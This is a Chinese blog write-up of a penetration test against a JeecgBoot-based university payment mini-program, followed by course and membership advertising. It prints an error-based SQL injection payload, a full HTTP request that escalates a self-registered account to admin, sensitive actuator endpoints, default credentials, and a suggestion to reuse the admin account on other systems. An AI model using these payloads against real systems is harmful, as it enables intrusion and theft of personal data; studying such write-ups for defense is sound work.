> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247489466&idx=1&sn=3630915a5db00418f1e7b18541bbb73a

#  渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞  
 不秃头的安全   2025-06-16 09:35  
  
## 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞  

```
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请私聊删除。
还在学怎么挖通用漏洞和src吗？
知识星球有什么，文章下限时优惠卷~~
想要入交流群在最下方，考安全证书请联系vx咨询。
```

  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fWaOQhXOf0cibja9IiaN9XvbmE5jLs5PByGh6NEsygeaAwonoQf8yKn2DtF6ZC0FshCkm3icyxic2lWqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
**0x1 jeecg框架简介**  
  
  
JeecgBoot是一款基于AIGC、BPM和低代码引擎的AI低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成->OnlineCoding-> 代码生成-> 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，快速提高效率 节省成本，同时又不失灵活性！低代码能力：Online表单、Online报表、大屏/仪表盘设计、表单设计、流程设计、报表设计;AI能力：AI应用平台+知识库问答、AI模型管理、AI流程编排、AI聊天、AI建表等,支持各种AI大模型ChatGPT、DeepSeek、Ollama等.  
  
  
jeecg官网如下：  
  

```
https://www.jeecg.com/
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9oTMiaDXgERRQrvLGmHI9KiaEWu6BclpibPDZh21jRXciaAibM6wIn8NhNibw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x2 jeecg综合漏洞利用工具**  
  
  
  
这里先给新手师傅们分享个还不错的jeecg漏洞利用工具，首先这个工具书GUI图形化工具，还有就是这个工具更新了很大jeecg的历史nday漏洞在里面，使用操作简单  
  
  
工具下载链接：  
  
https://github.com/MInggongK/jeecg-  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9VyGZqfbtam7Y9GZlem9b4zmrsSiaH1nc9pBZooWOzxdyGAZSbszcPPw/640?wx_fmt=png&from=appmsg "")  
  
  
  
这里给师傅们演示下，直接把可能存在jeecg漏洞的url导入目标中，然后选择ALL模块，进行检测即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9wSk1Nibyzg9mN2353lLVnpwXGMp9a4Hmcbv0icrplnNfyaNu5ibNr0EVA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**0x3 从小程序到web端接口泄露**  
  
  
  
好了，这里废话不多说了，这里回归这次渗透测试项目中来，再次给师傅们分享下这个漏洞，因为有些刚接触网安的师傅还没有接触这个漏洞，所以这里给大家分享下，这次jeecg漏洞通过以前保留的一些jeecg测试手册，一些jeecg的接口和bp数据包，像这样的jeecg框架系统，都是可以直接拿来测试  
  
  
1、首先，这个系统漏洞还是小程序，直接搜索对应资产小程序名称，这个系统是该市里面的一个大学的缴费系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9WicoJ3icLNWJC9nsStX1WVeaZoh6pCjBMlJj58O1sT1KZNKjia1lslqng/640?wx_fmt=png&from=appmsg "")  
  
  
  
2、打开微信小程序，首先我会直接去打开bp抓包，然后这里随便点击里面的功能点，然后进行看里面的数据包  
  
  
然后去翻里面的历史数据包，师傅们可以看到下面的table关键字  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM90jqiccpsq8phL8Ny0mcagCK16WF2OGLq0IEsOyJWM0JAVFbeXUwsH1g/640?wx_fmt=png&from=appmsg "")  
  
  
  
这个tableNane关键字让我感到兴趣，是因为开发人员在一些做接口命名的时候，不会随意取名称，他这个接口后面的tableNane=xxxx，这里我直接去拿table表名出线多的去尝试猜测下  
  
  
这里我尝试了几个，但是都没有出信息，还尝试了information_schema.tables表名，都没有什么数据回显  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM99ZkRpmXicaib5Ij71AvgotBTO49ng20Jiag6QtjzEGelKf5OVX1whQKxg/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后我这里还尝试直接把表名置空，但是依然没有什么敏感数据回显  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9uax0UwQAZqtF4Y6fqSAxqFJXbcA4LeuCDc2bRqjKoXmSUp3fWWEUwg/640?wx_fmt=png&from=appmsg "")  
  
  
3、这里直接把小程序数据包中的host域名和端口，直接放到web端去访问，然后再尝试别的测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9WyzjTqNXcQ6bjO008uNgfeEpxe36nnATorZ0lna3fgWZX4Ya4XFCPw/640?wx_fmt=png&from=appmsg "")  
  
  
  
4、这里使用findsomething插件，去跑下web页面泄露的接口，这里把收集到的接口放到一个1.txt的文件中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9rKcQIheHqgYE3OfflibZNndsGHUN7H2uBpkSlASzYqTQTxRjd0hc5xQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
5、这里师傅们要是没有思路，最简单的就是就可以直接把findsomething插件泄露的接口利用bp的POST和GET方法都跑一遍即可。但是这里我需要找找我保存的接口里面有没有泄露跟  
tableName  
相关的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9r31wbEAVgNia0kDzkTfqGzibA2ibGVf9aYtxVxgfPZ5BI1tO2SegzGSvw/640?wx_fmt=png&from=appmsg "")  
  
  
  
6、通过findsomething插件，得到了好几个tableName的接口，然后直接使用bp去访问，发现一个接口直接泄露了四百多个数据表格名称  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9HAmbIuulJsUYnqyRaHfichQXBnNGqksdVk5Jia1xPM6HotCDObol1icvQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后每个表里面都泄露了好几百个个人敏感信息，比如身份证、手机号、姓名之类的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9HJk7u8viaK8b5L6yd9RgxykxCohZfdwEguo6OL7iaYjWonLhfEqt4gcA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**0x4 SQL注入漏洞**  
  
  
  
这个小程序的一个接口还存在SQL注入漏洞，通过测试，直接可以注入出数据库名称，直接又一个SQL注入到手了  
  

```
SQL注入payload：updatexml(1,concat(0x7e,user(),0x7e),1)
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9RFRLBwta29JNR8LbZnxYDzRhuLEkvicd6muWPlBicqKIIu6X0XezDU9w/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x5 添加管理员用户**  
  
  
  
师傅们，其实测试到这里，这个系统小程序和web端都摸熟悉了，就是jeecg的系统框架，里面的很多接口都是jeecg开发默认的接口名称，但是前面的路径发生了一点变化，没有原班直接拿jeecg的接口使用，但是经过FUZZ测试出来了很多接口，这里给师傅们分享下，我先注册一个账号，然后提权到admin管理员账号的过程。  
  
  
首先我使用register注册接口，注册一个账号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9rSgBrTs2nkoV2SekImF2VLX70UdicWEiaI7ekc68MBX36dQEjkRLPmDg/640?wx_fmt=png&from=appmsg "")  
  
  
  
下面就是提权的一个操作了，需要再次FUZZ接口，因为打jeecg漏洞多的师傅们，都知道，jeecg有很多的接口，像什么注册、查信息，查user_id，查所以账号的token值，还有用户敏感信息等，但是现在很多系统都不会直接拿jeecg都路径接口部署了，多多少少会进行魔改  
  
  
这里首先需要查询管理员admin的账户ID  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9WfWPn2VHP0MSSP95JtUhzqW0Tt2kx9nVVgKzlHXPJErmbwfiaI4Nk3g/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后查询自己刚才创建用户的ID值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9FRpoF89TRHvciaNIhPkCXJcpYQKr8ucPHUuVdpw8UYL0qsiaib5vVoyiaA/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后使用打提权使用的jeecg漏洞poc，如下：  
  
  
//roleld填写需要提权的角色id userldList填写自己的id  
  

```
POST xxxxx/jeecg-boot/sys/user/addSysUserRole（jeecg接口，需要自己去尝试，不一定是我这个） HTTP/1.1
Host: 
Cookie: cna=Ov9SH4RxGiACAf////9C18zb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjUzNzMyNDMsInVzZXJuYW1lIjoiMTEwMTAyIn0.NXRckymfKdZvEFsDQZ9Jwvk_rU_gVny2Rx6A
Tenant-Id: 0
Origin:
Dnt: 1
Referer: 
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json
Content-Length: 96

{
&#34;roleId&#34;:&#34;xxxxxxxxxxx&#34;,
&#34;userIdList&#34;:[
&#34;xxxxxxxxxxxxxxxx&#34;
]

}
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYqyJBSm3GBzeNhSjmhtM9eVPUhaU1q56Npia6uezsXdbIMhfVAHxAQ3bEiapib1YmQiazBku7S0icEyA/640?wx_fmt=png&from=appmsg "")  
  
  
这样就成功创建了这个系统的admin管理员的账户了，后面的思考就是直接使用创建的账户密码，去尝试爆破登陆其他系统  
  
  
  
**0x6 其他jeecg小技巧**  
  
  
  
下面再给大家总结下jeecg的其他打法小技巧  
  
  
一、常见的接口敏感信息泄露：  
  

```
/v2/api-docs
/swagger-ui.html
/env

//获取参数信息
/actuator
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator/httptrace
```

  
二、常见jeecg框架接口关键字：  
  
  
像看到下面的几个关键字，首先需要想到使用jeecg去打，因为很多现在直接把jeecg关键字给魔改了  
  

```
jeecg/

api/sys/

sys/user
```

  
三、jeecg的几个常用弱口令：  
  
  
可以使用下面的弱口令去尝试爆破下登陆接口  
  

```
admin:123456

jeecg:123456
```

##   
  
**0x7 思路总结**  
  
  
  
然后还有很多其他的漏洞，这次文章就不一一给师傅们分享了，留着下次有时候给师傅们分享，这次写这篇文章由于之前的渗透测试项目漏洞都修复 了，我才写的这篇文章，所以实属不易，为了给师傅们演示的那么细致，特意去网上现找了一些漏洞实操截图给师傅们，因为之前的漏洞报告没有写的那么详细，这里怕新手师傅看不懂。  
  
  
这次渗透测试总共提交了四五十个漏洞报告，其中包括很多框架系统的默认弱口令，这个确实让我蛮意外的，还有一些网上的nday，这里面有些老系统也存在，因为测试的资产比较多，所以相对来讲出洞率较高。  
  
  
最后，希望看完这篇文章的你，也可以挖到心仪的漏洞！  
  
  
  
## 1. 需要考以下各类安全证书的可以联系  
  
学生pte超低价，绝对低价绝对优惠，CISP、PTE/PTS、DSG、IRE/IRS、NISP、PMP、CCSK、CISSP、ISO27001、IT服务项目经理等等巨优惠，想加群下方链接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fWicCSPZ1dUSIUCgV0AIqVEvpKGhRqawFMqm4UtxFKz2actiaswkxxiaQCmMVQJbZST9svQuMAQPHsfg/640?wx_fmt=jpeg&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVbuDda6lRd1bS4RbMPV90wJzvvoAABPNtPRknIycNP7cqh24T9zvhE3E2LMBBaN1XAg87pADhRmA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&watermark=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVbuDda6lRd1bS4RbMPV90w2xX5lDQvqUpB3r4QSCXdYd667aQbfiasqiceaqSVicnSsRZZ5mAOsyGDw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&watermark=1&tp=webp "")  
## 2. 需要入星球的可以私聊优惠  
  
投稿文章可免费进星球~~星球里有什么？  

```
1、维护更新src、cnxd、cnnxd专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、fafo/零零信安/QUAKE 高级会员key
3、POC及CXXD及CNNXD通用报告详情分享思路
4、知识星球专属微信“内部圈子交流群”
5、分享src挖掘技巧tips
6、最新新鲜工具分享
7、不定期有工作招聘内推（工作/护网内推）
8、攻防演练资源分享(免杀，溯源，钓鱼等)
9、19个专栏会持续更新~提前续费有优惠，好用不贵很实惠

```

  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fVbuDda6lRd1bS4RbMPV90wTNiaYCgKI1bUQMibeWp1K6eYeTjmEupb6PbyBcDKfTA9HxyoYFkcBicjQ/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp "")  
## 3、其他合作（合法合规）  
  
1、承接各种安全项目，需要攻防团队或岗位招聘都可代发、代招（灰黑勿扰）；  
  
2、各位安全老板需要文章推广的请私聊，承接合法合规推广文章发布，可直发、可按产品编辑推广；  
合作、推广代发、安全项目、岗位代招均可发布![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fVbuDda6lRd1bS4RbMPV90wXm1mKpj8HSoHq61rhUyATzqbOYOD7AlZ7Dic36e8SSNZRSNxx9ZFnwg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&watermark=1&tp=webp "")  
  
  
  
